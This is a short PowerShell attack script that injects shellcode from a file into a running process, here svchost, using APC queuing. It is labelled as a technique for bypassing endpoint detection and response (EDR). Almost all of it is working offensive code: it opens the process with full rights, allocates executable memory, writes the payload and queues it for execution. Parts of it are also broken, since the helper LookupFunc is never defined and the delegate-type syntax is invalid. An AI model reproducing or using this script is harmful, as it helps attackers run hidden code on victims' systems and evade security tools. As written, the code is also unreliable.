# STUA-X: APC INJECTION (EDR BYPASS)
function Invoke-APCInjection {
    param(
        [Parameter(Mandatory = $true)]
        [String]
        $ProcessName,
        [Parameter(Mandatory = $true)]
        [String]
        $ShellcodePath
    )

    # Read shellcode
    $shellcode = [IO.File]::ReadAllBytes($ShellcodePath)

    # Get target process
    $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
    if (-not $process) {
        $process = Start-Process -FilePath "C:\Windows\System32\$ProcessName" -PassThru
    }

    # Open process with full access
    $hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll OpenProcess),
        [type]([UInt32], [Boolean], [UInt32])
    ).Invoke(0x1F0FFF, $false, $process.Id)

    # Allocate memory in target process
    $remoteMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll VirtualAllocEx),
        [type]([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])
    ).Invoke($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)

    # Write shellcode
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll WriteProcessMemory),
        [type]([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])
    ).Invoke($hProcess, $remoteMemory, $shellcode, $shellcode.Length, [IntPtr]::Zero)

    # Queue APC
    $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll OpenThread),
        [type]([UInt32], [Boolean], [UInt32])
    ).Invoke(0x1FFFFF, $false, $process.Threads[0].Id)

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll QueueUserAPC),
        [type]([IntPtr], [IntPtr], [IntPtr])
    ).Invoke($remoteMemory, $hThread, [IntPtr]::Zero)

    Write-Host "[+] Shellcode injected into $ProcessName (PID: $($process.Id)) via APC" -ForegroundColor Green
}

Invoke-APCInjection -ProcessName "svchost" -ShellcodePath "shellcode.bin"